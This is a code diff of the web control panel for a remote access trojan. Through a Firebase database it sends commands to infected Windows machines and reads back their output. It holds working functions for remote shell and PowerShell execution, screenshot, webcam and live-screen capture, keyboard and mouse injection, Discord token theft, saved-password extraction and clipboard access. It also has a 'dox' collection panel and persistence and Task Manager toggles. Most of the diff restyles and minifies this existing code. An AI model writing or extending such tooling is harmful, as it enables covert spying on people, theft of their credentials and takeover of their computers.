-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxPw" checked>Passwords</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxTok" checked>Tokens</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxEnv" checked>Env</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxProc" checked>Processes</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxSvc" checked>Services</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxApps" checked>Apps</label>
-            <label style="display:flex;align-items:center;gap:3px;color:var(--text2)"><input type="checkbox" id="doxClip">Clipboard</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxHost" checked>Host</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxSys" checked>System</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxNet" checked>Network</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxPw" checked>Passwords</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxTok" checked>Tokens</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxEnv" checked>Env</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxProc" checked>Processes</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxSvc" checked>Services</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxApps" checked>Apps</label>
+            <label style="display:flex;align-items:center;gap:3px;color:var(--t2)"><input type="checkbox" id="doxClip">Clipboard</label>
           </div>
           <div id="doxProgress" style="display:none;margin-bottom:4px">
-            <div style="background:rgba(255,255,255,.06);border-radius:3px;height:4px;overflow:hidden"><div id="doxBar" style="background:var(--red);height:100%;width:0%;transition:width .3s"></div></div>
+            <div style="background:rgba(255,255,255,.04);border-radius:3px;height:4px;overflow:hidden"><div id="doxBar" style="background:linear-gradient(90deg,var(--cyan),var(--purple));height:100%;width:0%;transition:width .3s"></div></div>
           </div>
-          <div id="doxLog" style="font-size:.65rem;color:var(--text2);max-height:100px;overflow-y:auto"></div>
-          <div id="doxStatus" style="font-size:.65rem;color:var(--text2);margin-top:4px"></div>
+          <div id="doxLog" style="font-size:.65rem;color:var(--t2);max-height:100px;overflow-y:auto"></div>
+          <div id="doxStatus" style="font-size:.65rem;color:var(--t2);margin-top:4px"></div>
         </div>
       </div>
       <div class="loot-card">
         <div class="head">
           <span>Activity Log</span>
-          <button class="btn btn-g btn-sm" onclick="loadLog()" style="font-size:.6rem">⟳</button>
+          <button class="btn btn-g btn-sm" onclick="loadLog()" style="font-size:.6rem">&#8635;</button>
         </div>
         <div class="body" id="logOut"><div class="loading">Refresh</div></div>
         <div id="logErr" class="err"></div>
@@ -314,22 +317,22 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
         <div class="head"><span>Settings</span></div>
         <div class="body" style="max-height:none">
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
-            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Startup</span>
+            <span style="font-size:.7rem;min-width:55px;color:var(--t2)">Startup</span>
             <button class="btn btn-g btn-sm" id="setStartupBtn" onclick="toggleStartup()">...</button>
-            <span id="setStartupTxt" style="font-size:.65rem;color:var(--text2)">...</span>
+            <span id="setStartupTxt" style="font-size:.65rem;color:var(--t2)">...</span>
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
-            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Persistence</span>
-            <span id="setPersistTxt" style="font-size:.65rem;color:var(--text2)">...</span>
+            <span style="font-size:.7rem;min-width:55px;color:var(--t2)">Persistence</span>
+            <span id="setPersistTxt" style="font-size:.65rem;color:var(--t2)">...</span>
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
-            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Live Mon</span>
+            <span style="font-size:.7rem;min-width:55px;color:var(--t2)">Live Mon</span>
             <select class="sel" id="setLiveMon" style="width:50px;font-size:.68rem" onchange="setLiveMon()">
               <option value="0">M1</option><option value="1">M2</option><option value="2">M3</option><option value="3">M4</option>
             </select>
-            <span style="font-size:.7rem;min-width:30px;color:var(--text2)">Q</span>
-            <input type="range" id="setQuality" min="5" max="50" value="25" style="width:50px;accent-color:var(--accent);height:2px" oninput="setQVal.textContent=this.value">
-            <span id="setQVal" style="font-size:.65rem;color:var(--text2);min-width:1rem">25</span>
+            <span style="font-size:.7rem;min-width:30px;color:var(--t2)">Q</span>
+            <input type="range" id="setQuality" min="5" max="50" value="25" style="width:50px;accent-color:var(--cyan);height:2px" oninput="setQVal.textContent=this.value">
+            <span id="setQVal" style="font-size:.65rem;color:var(--t2);min-width:1rem">25</span>
             <button class="btn btn-g btn-sm" onclick="setLiveQ()" style="font-size:.6rem">Set</button>
             <span class="lb">Scale</span>
             <select class="sel" id="setScale" style="width:50px;font-size:.68rem">
@@ -338,114 +341,60 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
             <button class="btn btn-g btn-sm" onclick="setLiveS()" style="font-size:.6rem">Set</button>
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
-            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">PC</span>
-            <span id="setPCName" style="font-size:.7rem;color:var(--accent)"></span>
+            <span style="font-size:.7rem;min-width:55px;color:var(--t2)">PC</span>
+            <span id="setPCName" style="font-size:.7rem;color:var(--cyan)"></span>
             <span style="flex:1"></span>
             <button class="btn btn-d btn-sm" onclick="uninstallClient()" style="font-size:.65rem">Uninstall</button>
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
-            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Taskmgr</span>
+            <span style="font-size:.7rem;min-width:55px;color:var(--t2)">Taskmgr</span>
             <label class="toggle"><input type="checkbox" id="setTaskmgrChk" onchange="toggleTaskmgr()"><span class="sl"></span></label>
-            <span id="setTaskmgrTxt" style="font-size:.65rem;color:var(--text2)">...</span>
+            <span id="setTaskmgrTxt" style="font-size:.65rem;color:var(--t2)">...</span>
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
-            <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Reset</span>
+            <span style="font-size:.7rem;min-width:55px;color:var(--t2)">Reset</span>
             <label class="toggle"><input type="checkbox" id="setResetChk" onchange="toggleReset()"><span class="sl"></span></label>
-            <span id="setResetTxt" style="font-size:.65rem;color:var(--text2)">...</span>
+            <span id="setResetTxt" style="font-size:.65rem;color:var(--t2)">...</span>
           </div>
           <div id="setErr" class="err" style="margin-top:4px"></div>
         </div>
       </div>
     </div>
   </div>
-
 </div>
 
 <script>
-const FB = location.hostname==='localhost'||location.hostname==='127.0.0.1'
-  ? 'http://'+location.hostname+':3000'
-  : 'https://lucaaverij-default-rtdb.europe-west1.firebasedatabase.app';
+const FB=location.hostname==='localhost'||location.hostname==='127.0.0.1'?'http://'+location.hostname+':3000':'https://lucaaverij-default-rtdb.europe-west1.firebasedatabase.app';
 const params=new URLSearchParams(window.location.search);
 const computer=params.get('name')||'';
 document.getElementById('name').textContent=computer||'Unknown';
 document.title=computer||'Client';
-
 (async()=>{try{const r=await fetch(FB+'/pings/'+fbEsc(computer)+'.json');if(!r.ok)return;const d=await r.json();if(d)document.getElementById('meta').textContent='IP: '+(d.ip||'?')+' | '+new Date(d.created_at).toLocaleString()}catch{}})();
 
-// === Tab System ===
 const tabs=document.querySelectorAll('.tab');
 const panels={};
 document.querySelectorAll('.panel').forEach(p=>panels[p.id.replace('p-','')]=p);
 let currentTab='live';
-
 tabs.forEach(t=>{t.addEventListener('click',()=>switchTab(t.dataset.tab))});
-function switchTab(name){
-  tabs.forEach(t=>t.classList.toggle('active',t.dataset.tab===name));
-  Object.values(panels).forEach(p=>p.classList.remove('active'));
-  if(panels[name])panels[name].classList.add('active');
-  currentTab=name;
-  if(name==='files'&&!g_fp)browseDir('');
-}
+function switchTab(name){tabs.forEach(t=>t.classList.toggle('active',t.dataset.tab===name));Object.values(panels).forEach(p=>p.classList.remove('active'));if(panels[name])panels[name].classList.add('active');currentTab=name;if(name==='files'&&!g_fp)browseDir('')}
 
-// === sendAndWait ===
 let g_fe=null;
-async function saw(type,payload,el,errId){
-  const ee=document.getElementById(errId);if(ee)ee.style.display='none';
-  if(el)el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';
-  const id='c'+Date.now().toString(36)+Math.random().toString(36).slice(2,10);
-  const base=FB+'/commands/'+fbEsc(computer);
-  try{
-    const r=await fetch(base+'/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
-    if(!r.ok){if(el)el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(ee){ee.textContent='Server '+r.status;ee.style.display='block'}return null}
-    if(el)el.innerHTML='<div class="loading"><span class="sp"></span>Waiting...</div>';
-    for(let i=0;i<50;i++){
-      if(i)await new Promise(r=>setTimeout(r,100));
-      try{const r2=await fetch(base+'.json?_='+Date.now(),{cache:'no-store'});if(!r2.ok)continue;const all=await r2.json();if(all&&all[id]&&all[id].status==='done'){const row=all[id];fetch(base+'/'+id+'.json',{method:'DELETE'}).catch(()=>{});return row}}catch{}
-    }
-    if(el)el.innerHTML='<div class="loading">Timeout</div>';if(ee){ee.textContent='No response';ee.style.display='block'}return null
-  }catch(e){if(el)el.innerHTML='<div class="loading">Error</div>';if(ee){ee.textContent=e.message||'err';ee.style.display='block'}return null}
-}
-
+async function saw(type,payload,el,errId){const ee=document.getElementById(errId);if(ee)ee.style.display='none';if(el)el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';const id='c'+Date.now().toString(36)+Math.random().toString(36).slice(2,10);const base=FB+'/commands/'+fbEsc(computer);try{const r=await fetch(base+'/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});if(!r.ok){if(el)el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(ee){ee.textContent='Server '+r.status;ee.style.display='block'}return null}if(el)el.innerHTML='<div class="loading"><span class="sp"></span>Waiting...</div>';for(let i=0;i<50;i++){if(i)await new Promise(r=>setTimeout(r,100));try{const r2=await fetch(base+'.json?_='+Date.now(),{cache:'no-store'});if(!r2.ok)continue;const all=await r2.json();if(all&&all[id]&&all[id].status==='done'){const row=all[id];fetch(base+'/'+id+'.json',{method:'DELETE'}).catch(()=>{});return row}}catch{}}if(el)el.innerHTML='<div class="loading">Timeout</div>';if(ee){ee.textContent='No response';ee.style.display='block'}return null}catch(e){if(el)el.innerHTML='<div class="loading">Error</div>';if(ee){ee.textContent=e.message||'err';ee.style.display='block'}return null}}
 function fbEsc(s){return String(s).replace(/[\/\.\#\$\[\]]/g,'_')}
 function esc(s){if(!s)return'';return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
 function uenc(s){return encodeURIComponent(s).replace(/'/g,'%27')}
 
-// === CMD ===
-async function runCmd(){
-  const inp=document.getElementById('cmdIn');const cmd=inp.value.trim();if(!cmd)return
-  const out=document.getElementById('cmdOut');out.textContent+='❯ '+cmd+'\n';inp.value='';
-  const r=await saw('cmd',cmd,out,'cmdErr');if(r)out.textContent+=(r.result||'(no output)')+'\n';out.scrollTop=out.scrollHeight
-}
+async function runCmd(){const inp=document.getElementById('cmdIn');const cmd=inp.value.trim();if(!cmd)return;const out=document.getElementById('cmdOut');out.textContent+='> '+cmd+'\n';inp.value='';const r=await saw('cmd',cmd,out,'cmdErr');if(r)out.textContent+=(r.result||'(no output)')+'\n';out.scrollTop=out.scrollHeight}
 function copyCmdOut(){navigator.clipboard.writeText(document.getElementById('cmdOut').textContent).then(()=>toast('Output copied'))}
 function clrCmd(){document.getElementById('cmdOut').textContent='Ready.'}
 
-// === Screenshot / Webcam / Tokens ===
-async function takeSS(){const el=document.getElementById('liveOut');const mon=document.getElementById('monSel').value;const r=await saw('screenshot',mon,el,'ssErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
-async function takeCam(){const el=document.getElementById('liveOut');const ee=document.getElementById('camErr');ee.style.display='none';const r=await saw('webcam','',el,'camErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>';}
-async function grabTok(){const el=document.getElementById('tokOut');const ee=document.getElementById('tokErr');ee.style.display='none';const r=await saw('discord_tokens','',el,'tokErr');if(r&&r.result)el.innerHTML='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:.75rem;line-height:1.5">'+esc(r.result)+'</pre>';else if(r)el.innerHTML='<div class="loading">No tokens</div>';}
+async function takeSS(){const el=document.getElementById('liveOut');const mon=document.getElementById('monSel').value;const r=await saw('screenshot',mon,el,'ssErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>'}
+async function takeCam(){const el=document.getElementById('liveOut');const r=await saw('webcam','',el,'camErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">';else if(r)el.innerHTML='<div class="loading">Empty</div>'}
+async function grabTok(){const el=document.getElementById('tokOut');const r=await saw('discord_tokens','',el,'tokErr');if(r&&r.result)el.innerHTML='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:.75rem;line-height:1.5">'+esc(r.result)+'</pre>';else if(r)el.innerHTML='<div class="loading">No tokens</div>'}
 
-// === Live Screen ===
 let liveOn=false,fc=0,fpsT=0,pollLast=0;
-async function startLive(){
-  document.getElementById('liveStart').style.display='none';document.getElementById('liveStop').style.display='';liveOn=true;fc=0;fpsT=Date.now();pollLive()
-}
-async function pollLive(){
-  if(!liveOn)return;
-  try{
-    const r=await fetch(FB+'/live/'+fbEsc(computer)+'.json?_='+Date.now(),{cache:'no-store'});
-    if(r.ok){const row=await r.json();if(row&&row.r){
-      const t=new Date(row.t).getTime();const el=document.getElementById('liveOut');
-      if(Date.now()-t<30000){
-        const src='data:image/jpeg;base64,'+row.r;
-        if(el.querySelector('img')){el.querySelector('img').src=src}
-        else{el.innerHTML='<div class="screen-container" style="position:relative;display:inline-block;max-width:100%"><img class="img-out" id="liveImg" src="'+src+'"><canvas id="liveCanvas" style="position:absolute;top:0;left:0;cursor:crosshair"></canvas></div>';setupCanvas()}
-        pollLast=t;fc++
-      }
-    }}
-  }catch{}
-  const fps=Date.now()-fpsT>=1000?(document.getElementById('fps').textContent=Math.round(fc/((Date.now()-fpsT)/1000))+' fps',fc=0,fpsT=Date.now()):0
-  setTimeout(pollLive,100)
-}
+async function startLive(){document.getElementById('liveStart').style.display='none';document.getElementById('liveStop').style.display='';liveOn=true;fc=0;fpsT=Date.now();pollLive()}
+async function pollLive(){if(!liveOn)return;try{const r=await fetch(FB+'/live/'+fbEsc(computer)+'.json?_='+Date.now(),{cache:'no-store'});if(r.ok){const row=await r.json();if(row&&row.r){const t=new Date(row.t).getTime();const el=document.getElementById('liveOut');if(Date.now()-t<30000){const src='data:image/jpeg;base64,'+row.r;if(el.querySelector('img')){el.querySelector('img').src=src}else{el.innerHTML='<div style="position:relative;display:inline-block;max-width:100%"><img class="img-out" id="liveImg" src="'+src+'"><canvas id="liveCanvas" style="position:absolute;top:0;left:0;cursor:crosshair"></canvas></div>';setupCanvas()}pollLast=t;fc++}}}}catch{}const fps=Date.now()-fpsT>=1000?(document.getElementById('fps').textContent=Math.round(fc/((Date.now()-fpsT)/1000))+' fps',fc=0,fpsT=Date.now()):0;setTimeout(pollLive,100)}
 function stopLive(){liveOn=false;document.getElementById('liveStart').style.display='';document.getElementById('liveStop').style.display='none';document.getElementById('fps').textContent='0 fps';document.getElementById('liveOut').innerHTML='<div class="loading">Stopped</div>';if(mouseOn)tgMouse();if(keyOn)tgKey()}
 async function sendLiveCfg(){const q=document.getElementById('liveQ').value;const s=document.getElementById('liveS').value;try{await fetch(FB+'/commands/'+fbEsc(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'live_config',payload:JSON.stringify({quality:parseInt(q),scale:parseFloat(s),monitor:parseInt(document.getElementById('liveMon').value)}),status:'pending'})})}catch{}}
 function setupCanvas(){const img=document.getElementById('liveImg');const c=document.getElementById('liveCanvas');if(!img||!c)return;const rz=()=>{c.width=img.clientWidth;c.height=img.clientHeight;c.style.width=img.clientWidth+'px';c.style.height=img.clientHeight+'px'};img.onload=rz;setTimeout(rz,100)}
@@ -460,200 +409,66 @@ function sendKeySpecial(code){sf('keyboard',JSON.stringify({key:code,action:'dow
 document.addEventListener('keydown',function(e){if(!keyOn||e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;if(e.target.id==='keyTypeIn')return;e.preventDefault();sf('keyboard',JSON.stringify({key:e.keyCode,action:'down'}))});
 document.addEventListener('keyup',function(e){if(!keyOn||e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;if(e.target.id==='keyTypeIn')return;e.preventDefault();sf('keyboard',JSON.stringify({key:e.keyCode,action:'up'}))});
 
-// === Processes ===
 let gProc=[],gProcFiltered=[];
-async function loadProc(){const el=document.getElementById('procOut');const ee=document.getElementById('procErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('process_list','',el,'procErr');if(r&&r.result){renderProc(r.result)}}
+async function loadProc(){const el=document.getElementById('procOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('process_list','',el,'procErr');if(r&&r.result)renderProc(r.result)}
 function renderProc(json){const el=document.getElementById('procOut');let e;try{e=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}if(!Array.isArray(e)){el.innerHTML='<div class="loading">Bad response</div>';return}gProc=e;document.getElementById('procCnt').textContent=e.length+' procs';filterProc()}
-function filterProc(){const q=document.getElementById('procSearch').value.toLowerCase();const el=document.getElementById('procOut');const f=gProc.filter(e=>(e.n||'').toLowerCase().includes(q));if(!f.length){el.innerHTML='<div class="loading">No matches</div>';return}let html='<table class="proc-t"><thead><tr><th>Process</th><th>PID</th><th></th></tr></thead><tbody>';f.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td class="pnm">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkl"><button class="btn btn-d btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">✕</button></td></tr>'});html+='</tbody></table>';el.innerHTML=html}
-async function killProc(pid,name){try{name=decodeURIComponent(name)}catch{}if(!confirm('Kill '+name+' (PID '+pid+')?'))return;const el=document.getElementById('procOut');const r=await saw('kill_process',String(pid),el,'procErr');if(r&&r.result==='ok')loadProc();else if(r)toast('Failed: '+r.result)}
-let g_procTableStyle='proc-t';
-document.head.insertAdjacentHTML('beforeend','<style>.proc-t{width:100%;border-collapse:collapse;font-family:\'JetBrains Mono\',\'SF Mono\',Consolas,monospace;font-size:.7rem}.proc-t th{background:rgba(0,0,0,.2);color:var(--text2);padding:.25rem.5rem;text-align:left;border-bottom:1px solid var(--border);position:sticky;top:0;font-weight:600;font-size:.6rem;text-transform:uppercase;letter-spacing:.05em}.proc-t td{padding:.15rem.5rem;border-bottom:1px solid rgba(255,255,255,.02)}.proc-t tr:hover{background:rgba(88,100,255,.03)}.proc-t .pid{color:var(--text2);width:3rem}.proc-t .pnm{color:var(--text)}.proc-t .pkl{width:2.5rem;text-align:center}</style>');
+function filterProc(){const q=document.getElementById('procSearch').value.toLowerCase();const el=document.getElementById('procOut');const f=gProc.filter(e=>(e.n||'').toLowerCase().includes(q));if(!f.length){el.innerHTML='<div class="loading">No matches</div>';return}let html='<table style="width:100%;border-collapse:collapse;font-family:\'Cascadia Code\',\'Fira Code\',Consolas,monospace;font-size:.7rem"><thead><tr><th style="background:rgba(0,0,0,.2);color:var(--t2);padding:.25rem .5rem;text-align:left;border-bottom:1px solid var(--bdr);position:sticky;top:0;font-weight:600;font-size:.6rem;text-transform:uppercase;letter-spacing:.05em">Process</th><th style="background:rgba(0,0,0,.2);color:var(--t2);padding:.25rem .5rem;text-align:left;border-bottom:1px solid var(--bdr)">PID</th><th style="background:rgba(0,0,0,.2);padding:.25rem .5rem;border-bottom:1px solid var(--bdr)"></th></tr></thead><tbody>';f.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td style="padding:.15rem .5rem;border-bottom:1px solid rgba(255,255,255,.02);color:var(--t1)">'+esc(nm)+'</td><td style="padding:.15rem .5rem;border-bottom:1px solid rgba(255,255,255,.02);color:var(--t2);width:3rem">'+pid+'</td><td style="padding:.15rem .5rem;border-bottom:1px solid rgba(255,255,255,.02);width:2.5rem;text-align:center"><button class="btn btn-d btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">X</button></td></tr>'});html+='</tbody></table>';el.innerHTML=html}
+async function killProc(pid,name){try{name=decodeURIComponent(name)}catch{}if(!confirm('Kill '+name+' (PID '+pid+')?'))return;const r=await saw('kill_process',String(pid),document.getElementById('procOut'),'procErr');if(r&&r.result==='ok')loadProc();else if(r)toast('Failed: '+r.result)}
 
-// === System Commands ===
-async function sysCmd(t){const el=document.getElementById('sysOut');if(t==='shutdown'||t==='restart')if(!confirm(t+'?'))return;const r=await saw(t,'',el,'sysErr');if(r)el.innerHTML='<div style="color:var(--green)">✓ '+t+'</div>'}
-function showMsg(){const t=prompt('Msg:');if(!t)return;const ti=prompt('Title:','Remote');const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';saw('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),el,'sysErr').then(r=>{if(r)el.innerHTML='<div style="color:var(--green)">✓ Sent</div>'})}
-async function getClip(){const el=document.getElementById('sysOut');const r=await saw('clipboard','',el,'sysErr');if(r)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
-async function getIdle(){const el=document.getElementById('sysOut');const r=await saw('idle','',el,'sysErr');if(r)el.innerHTML='Idle: '+esc(r.result)+'s'}
-async function getUp(){const el=document.getElementById('sysOut');const r=await saw('uptime','',el,'sysErr');if(r)el.innerHTML='Uptime: '+esc(r.result)+'s ('+Math.floor(parseInt(r.result||'0')/3600)+'h)'}
-async function runPS(){const c=document.getElementById('psIn').value.trim();if(!c)return;const el=document.getElementById('cmdOut');el.innerHTML+='\n❯ PS> '+c+'\n';const r=await saw('powershell',c,el,'cmdErr');if(r)el.innerHTML+=(r.result||'(no output)')+'\n';el.scrollTop=el.scrollHeight}
-async function loadSys(){const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('system_info','',el,'sysErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('sysGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM Total</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="l">'+(dk.t/1024).toFixed(1)+' GB total</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--green)">✓ System info</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
+async function sysCmd(t){if(t==='shutdown'||t==='restart')if(!confirm(t+'?'))return;const r=await saw(t,'',document.getElementById('sysOut'),'sysErr');if(r)document.getElementById('sysOut').innerHTML='<div style="color:var(--green)">'+t+' sent</div>'}
+function showMsg(){const t=prompt('Msg:');if(!t)return;const ti=prompt('Title:','Remote');saw('msgbox',JSON.stringify({text:t,title:ti||'Remote'}),document.getElementById('sysOut'),'sysErr').then(r=>{if(r)document.getElementById('sysOut').innerHTML='<div style="color:var(--green)">Sent</div>'})}
+async function getClip(){const r=await saw('clipboard','',document.getElementById('sysOut'),'sysErr');if(r)document.getElementById('sysOut').innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.75rem">'+esc(r.result)+'</pre>'}
+async function runPS(){const c=document.getElementById('psIn').value.trim();if(!c)return;const el=document.getElementById('cmdOut');el.innerHTML+='\nPS> '+c+'\n';const r=await saw('powershell',c,el,'cmdErr');if(r)el.innerHTML+=(r.result||'(no output)')+'\n';el.scrollTop=el.scrollHeight}
+async function loadSys(){const el=document.getElementById('sysOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('system_info','',el,'sysErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('sysGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM Total</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="l">'+(dk.t/1024).toFixed(1)+' GB total</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--green)">System info loaded</div>'}catch{el.innerHTML='<div class="loading">Parse error</div>'}}}
 async function sendVol(){const v=document.getElementById('volSl').value;const el=document.getElementById('sysOut');await saw('volume',v,el,'sysErr');el.innerHTML='<div style="color:var(--green)">Vol: '+v+'</div>'}
-async function setWall(){const p=document.getElementById('wallIn').value.trim();if(!p)return;const el=document.getElementById('sysOut');const r=await saw('wallpaper',p,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--green)">Wallpaper set</div>'}
-async function setClip(){const t=document.getElementById('clipIn').value;if(!t)return;const el=document.getElementById('sysOut');const r=await saw('clipboard_write',t,el,'sysErr');if(r)el.innerHTML='<div style="color:var(--green)">Clipboard written</div>'}
+async function setWall(){const p=document.getElementById('wallIn').value.trim();if(!p)return;const r=await saw('wallpaper',p,document.getElementById('sysOut'),'sysErr');if(r)document.getElementById('sysOut').innerHTML='<div style="color:var(--green)">Wallpaper set</div>'}
+async function setClip(){const t=document.getElementById('clipIn').value;if(!t)return;const r=await saw('clipboard_write',t,document.getElementById('sysOut'),'sysErr');if(r)document.getElementById('sysOut').innerHTML='<div style="color:var(--green)">Clipboard written</div>'}
 
-// === LOOT commands ===
-async function loadPW(){const el=document.getElementById('pwOut');const ee=document.getElementById('pwErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Extracting...</div>';const r=await saw('passwords','',el,'pwErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>';toast('Passwords extracted')}}
-async function loadNet(){const el=document.getElementById('netOut');const ee=document.getElementById('netErr');ee.style.display='none';el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Loading net...</div>';const r=await saw('network_info','',el,'netErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
-async function loadSvc(){const el=document.getElementById('svcOut');const ee=document.getElementById('svcErr');ee.style.display='none';el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Loading services...</div>';const r=await saw('services','',el,'svcErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>';const l=r.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME'));document.getElementById('svcCnt').textContent='~'+l.length+' svcs'}}
-async function loadApps(){const el=document.getElementById('appOut');const ee=document.getElementById('appErr');ee.style.display='none';el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Listing apps...</div>';const r=await saw('installed_apps','',el,'appErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
+async function loadPW(){const el=document.getElementById('pwOut');el.innerHTML='<div class="loading"><span class="sp"></span>Extracting...</div>';const r=await saw('passwords','',el,'pwErr');if(r&&r.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>';toast('Passwords extracted')}}
